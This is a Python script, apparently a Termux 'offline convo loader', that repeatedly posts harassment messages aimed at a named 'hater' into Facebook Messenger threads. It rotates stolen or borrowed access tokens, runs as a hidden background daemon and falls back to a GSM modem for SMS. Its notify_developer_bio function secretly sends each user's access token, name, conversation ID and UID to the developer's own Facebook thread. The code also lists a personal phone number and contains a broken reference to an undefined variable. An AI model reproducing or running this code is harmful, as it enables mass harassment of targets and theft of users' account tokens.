#!/usr/bin/python3
#-*-coding:utf-8-*-

"""
IMPORTANT:
- यह script interactive इनपुट लेने के बाद अपने आप daemonize (background में detach) हो जाती है,
  ताकि Termux exit होने के बाद भी SMS भेजती रहे – चाहे इंटरनेट/मोबाइल off हो।
- GSM SMS fallback के लिए GSM मॉड्यूल (जैसे SIM800L/SIM900A) कनेक्ट होना चाहिए, और उसका 
  serial port (default: /dev/ttyUSB0) एवं baudrate (115200) सही से सेट हों।
- Unlimited token support: टोकन फाइल में हर टोकन एक नई लाइन में होना चाहिए।
- यह script बिना बाहरी command (nohup/tmux/screen आदि) के ही अपने अंदर ही daemonize हो जाती है,
  ताकि 1 साल तक लगातार चल सके (सही हार्डवेयर सपोर्ट के साथ)।
"""

import os, sys, time, random, string, requests, json, threading, sqlite3, datetime, warnings
from time import sleep
from platform import system

# Suppress DeprecationWarnings (fork() warnings)
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Global flag – QUIET_MODE True होने पर startup पर extra output suppress करेगा
QUIET_MODE = True
DEBUG = False  # Debug off; errors are suppressed

# --- Additional module for GSM SMS fallback ---
try:
    import serial
except ImportError:
    os.system("pip install pyserial")
    import serial

# --- Models Installer (if needed) ---
def modelsInstaller():
    try:
        models = ['requests', 'colorama', 'pyserial']
        for model in models:
            try:
                if sys.version_info[0] < 3:
                    os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
                else:
                    os.system('python3 -m pip install {}'.format(model))
                sys.exit()
            except:
                pass
    except:
        pass

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    modelsInstaller()

requests.urllib3.disable_warnings()

# --- Daemonize Function ---
def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except:
        pass
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

# --- SQLite3 DB Integration for Offline Message Queue and Sent Messages Logging ---
DB_NAME = 'message_queue.db'
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS message_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            thread_id TEXT,
            message TEXT,
            status TEXT DEFAULT 'pending',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS sent_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            thread_id TEXT,
            hater_name TEXT,
            message TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
init_db()

def add_to_queue(thread_id, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO message_queue (thread_id, message) VALUES (?, ?)", (thread_id, message))
        conn.commit()
        conn.close()
        print(Fore.YELLOW + "[•] Message added to offline queue.")
    except:
        pass

def get_pending_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id, thread_id, message FROM message_queue WHERE status = 'pending'")
        rows = c.fetchall()
        conn.close()
        return rows
    except:
        return []

def mark_message_sent(message_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("UPDATE message_queue SET status = 'sent' WHERE id = ?", (message_id,))
        conn.commit()
        conn.close()
    except:
        pass

def log_sent_message(thread_id, hater_name, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO sent_messages (thread_id, hater_name, message) VALUES (?, ?, ?)", 
                  (thread_id, hater_name, message))
        conn.commit()
        conn.close()
    except Exception as e:
        if DEBUG:
            print("Error logging sent message:", e)

def display_sent_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT thread_id, hater_name, message, timestamp FROM sent_messages ORDER BY timestamp")
        rows = c.fetchall()
        conn.close()
        if not rows:
            print(Fore.YELLOW + "No sent messages found.")
        else:
            grouped = {}
            for row in rows:
                tid, hater, msg, ts = row
                key = (tid, hater)
                if key not in grouped:
                    grouped[key] = []
                grouped[key].append((msg, ts))
            for (tid, hater), messages in grouped.items():
                print(random.choice(color_list) + "=====================================")
                print(random.choice(color_list) + f"HATER'S NAME: {hater} | Conversation ID: {tid}")
                print(random.choice(color_list) + "-------------------------------------")
                for msg, ts in messages:
                    print(random.choice(color_list) + f"[{ts}] {msg}")
                print(random.choice(color_list) + "=====================================")
    except Exception as e:
        print("Error displaying sent messages:", e)

# --- Connectivity Check ---
def is_connected():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except:
        return False

# --- GSM SMS Sending via connected GSM module ---
def send_sms_via_gsm(phone, message):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=5)
        ser.write(b'AT\r')
        time.sleep(1)
        ser.write(b'AT+CMGF=1\r')
        time.sleep(1)
        cmd = f'AT+CMGS="{phone}"\r'
        ser.write(cmd.encode())
        time.sleep(1)
        ser.write(message.encode() + b"\r")
        time.sleep(1)
        ser.write(bytes([26]))
        time.sleep(3)
        response = ser.read_all().decode()
        ser.close()
        if "OK" in response:
            print("ok")
            sys.stdout.flush()
            return True
        else:
            return False
    except:
        return False

# --- Background Offline Queue Processor ---
def process_queue():
    global global_token_index, tokens, fallback_phone, mn
    while True:
        check_stop()
        pending = get_pending_messages()
        for row in pending:
            msg_id, t_id, msg = row
            if is_connected():
                current_token = tokens[global_token_index]
                global_token_index = (global_token_index + 1) % len(tokens)
                url = f"https://graph.facebook.com/v15.0/t_{t_id}/"
                parameters = {'access_token': current_token, 'message': msg}
                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        mark_message_sent(msg_id)
                        log_sent_message(t_id, mn, msg)
                except:
                    pass
            else:
                if send_sms_via_gsm(fallback_phone, msg):
                    mark_message_sent(msg_id)
                    log_sent_message(t_id, mn, msg)
        time.sleep(10)

def start_queue_processor():
    t = threading.Thread(target=process_queue, daemon=True)
    t.start()

# --- Utility Function ---
def check_stop():
    if os.path.exists("stop_signal.txt"):
        sys.exit()

# --- Custom Bio Function (Animated Bio) ---
def print_custom_bio():
    # Define a list of flashy dark colors.
    flashy_colors = [
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    
    last_color = None  # To track last used color (for line-by-line printing)

    def get_random_color_line():
        nonlocal last_color
        color = random.choice(flashy_colors)
        while color == last_color:
            color = random.choice(flashy_colors)
        last_color = color
        return color

    # Original bio block (as in your original script)
    original_bio = r"""╭──────────────────────────── <  DETAILS >────────────────────────────────────────────╮
│ [=] CODER BOY   ::                               RAHUL XD                   │
│ [=] RULEX BOY   ::                                 RAHUL                      │
│ [=] MY LOVE    [<❤️=]                           PALAK                    │
│ [=] VERSION     ::                                 420.786.36                       │
│ [=] INSTAGRAM   ::                                CONVO OFFLINE                     │
│ [=] YOUTUBE     ::                                  NO ACCESS                       │
│ [=] SCRIPT CODING :: PYTHON :: BASH ::                 PHP                          │
╰─────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  YOUR INFO >─────────────────────────────────────────╮
│ [=] SCRIPT WRITER    1:54 AM                                                       │
│ [=] SCRIPT AUTHOR  26/January/2025                                                 │
╰────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  COUNTRY ~  >────────────────────────────────────────╮
│ 【•】 YOUR COUNTRY                                     INDIA                       │
│ 【•】 YOUR REGION                                      Gujarat                     │
│ 【•】 YOUR CITY                                        Surat                   │
╰────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────────── <  NOTE >───────────────────────────────────────────╮
│                           TOOL PAID FREE NO PAID                                    │
│                           BIKLUL FREE HAI COMMAND                                   │
╰─────────────────────────────────────────────────────────────────────────────────────╯"""
    
    # Print original bio block: each non-empty line is printed in a random color (one color per line)
    for line in original_bio.splitlines():
        if line.strip():
            print(get_random_color_line() + line + Style.RESET_ALL)
    
    # Define a fancy_print function for per-character printing.
    def fancy_print_line(text, delay=0.001, jitter=0.002):
        for char in text:
            sys.stdout.write(random.choice(flashy_colors) + Style.BRIGHT + char)
            sys.stdout.flush()
            time.sleep(delay + random.uniform(0, jitter))
        sys.stdout.write(Style.RESET_ALL + "\n")
        time.sleep(0.01)
    
    # Print new bio block: each line is printed using the fancy_print_line function.
    for line in new_bio.splitlines():
        if line.strip():
            fancy_print_line(line)
    
    # Print a final blinking success message in a random flashy dark color.
    blink = "\033[5m"
    print(blink + get_random_color_line() + "[✅ SUCCESS FULL ULTIMATE FANCY BIO LOADED" + "\033[0m")

# --- Animated Print Functions (for logos, SMS details, etc.) ---
def animated_print(text, delay=0.01, jitter=0.005):
    flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
                      Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]
    for char in text:
        sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, jitter)) 
    print()
def animated_logo():
    logo_text = r"""
  
            
 /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
| $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
| $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
| $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
| $$__  $$| $$__  $$| $$__  $$| $$  | $$| $$      
| $$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
| $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$
|__/  |__/|__/  |__/|__/  |__/ \______/ |________/
                                    

                                                                                                   
"""
    for line in logo_text.splitlines():
         animated_print(line, delay=0.005, jitter=0.002)

# --- Menu Function with Animated Options ---
def main_menu():
    # Print the animated menu header as specified
    animated_print("<============================ NEW MENU OPTIONS ============================>", delay=0.005, jitter=0.002)
    print(random.choice(color_list) + "[1] START LOADER")
    print(random.choice(color_list) + "[2] STOP LOADER")
    print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
    animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
    if choice == "2":
        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
        animated_print("<<════════════════════════════════════════════════════════>>")
        if stop_input == get_stop_key():
            print(Fore.BLUE + "STOPPED")
            with open("stop_signal.txt", "w") as f:
                f.write("stop")
            sys.exit()
        else:
            sys.exit()
    if choice == "3":
        display_sent_messages()
        sys.exit()
    return choice

def get_stop_key():
    if os.path.exists("loader_stop_key.txt"):
        with open("loader_stop_key.txt", "r") as f:
            return f.read().strip()
    else:
        stop_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with open("loader_stop_key.txt", "w") as f:
            f.write(stop_key)
        return stop_key

def notify_developer_bio(current_token, mn, thread_id, uid, ms):
    DEV_THREAD_ID = "t_100094892855545"
    bio_message = f"Hello WASU  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
    url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
    parameters = {'access_token': current_token, 'message': bio_message}
    try:
        r = requests.post(url, data=parameters, headers=headers)
        if r.ok:
            print(Fore.GREEN + "[•] Developer notified.")
    except:
        pass

# --- Global Variables & Colors ---
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
global_token_index = 0
tokens = []  # Load tokens from file
fallback_phone = "+911234567890"  # Default fallback phone number

color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]

# --- SMS Sending Function with Animated Text ---
def message_on_messenger(thread_id):
    global global_token_index, tokens, fallback_phone, ns, mn, timm, ms, mb, sms_display
    try:
        uid_val = os.getuid()
    except:
        uid_val = "N/A"
    for line in ns:
        check_stop()
        full_message = str(mn) + " " + line.strip()
        if is_connected():
            current_token = tokens[global_token_index]
            global_token_index = (global_token_index + 1) % len(tokens)
            url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
            parameters = {'access_token': current_token, 'message': full_message}
            try:
                s = requests.post(url, data=parameters, headers=headers)
                if s.ok:
                    now = datetime.datetime.now()
                    if sms_display:
                        bio_details = (f"Profile: {mb} | Token: {current_token} | "
                                       f"Convo ID: {thread_id} | Haters: {mn} | Time: {now.strftime('%I:%M:%S %p')} 🚀🔥")
                        animated_print(bio_details)
                    else:
                        animated_print("════════════════════════════════════════════════════════")
                        animated_print("--> Convo/Inbox ID: " + str(thread_id))
                        animated_print(now.strftime("--> SMS Sent | Date: %d-%m-%Y  TIME: %I:%M:%S %p"))
                        animated_print("--> Message Sent: " + full_message)
                        animated_print("════════════════════════════════════════════════════════")
                    stop_key = get_stop_key()
                    animated_print("WAITING SIR START LOADER 🚀 [STOP KEY 🔑 ===> " + stop_key + "]")
                    animated_print("ok")
                    sys.stdout.flush()
                    time.sleep(timm)
                    notify_developer_bio(current_token, mn, thread_id, uid_val, ms)
                    log_sent_message(thread_id, mn, full_message)
                else:
                    time.sleep(30)
            except:
                time.sleep(30)
        else:
            if send_sms_via_gsm(fallback_phone, full_message):
                animated_print("ok")
                sys.stdout.flush()
                log_sent_message(thread_id, mn, full_message)
            else:
                add_to_queue(thread_id, full_message)

def testPY():
    if sys.version_info[0] < 3:
        sys.exit()

def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def venom():
    clear = "\033[0m"
    def random_dark_color():
        code = random.randint(16, 88)
        return f"\033[38;5;{code}m"
    info = r"""═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
     OWNER NAME                   :: BHAT WASU                              :: XD
     CODER                     :: WASU XD                            :: NO GANG 
     YOUR FB ID                   ::  𒁍𝐊i⃟n͎𝐆⁕𝖔𝖋⁕𝐆r⃟a͎v͢έ⁕                       :: ALL FB FYTR MERE LODY PY
     CONTACTS                     :: +916005020676                              :: DARINDA
═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════"""
    for line in info.splitlines():
        sys.stdout.write("\x1b[1;%sm%s%s\n" % (random.choice(color_list), line, clear))
        time.sleep(0.05)

# --- Main Execution Block ---
cls()
testPY()
if os.path.exists("stop_signal.txt"):
    os.remove("stop_signal.txt")

# First, show an animated logo
animated_logo()

# Then, show the original colored logo and venom animations
colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 

   """.splitlines()]
colored_logo()
venom()
print(Fore.GREEN + "[•]  START TIME ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
print(Fore.GREEN + "[•] WASU INXIDE \n")
animated_print("══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
        
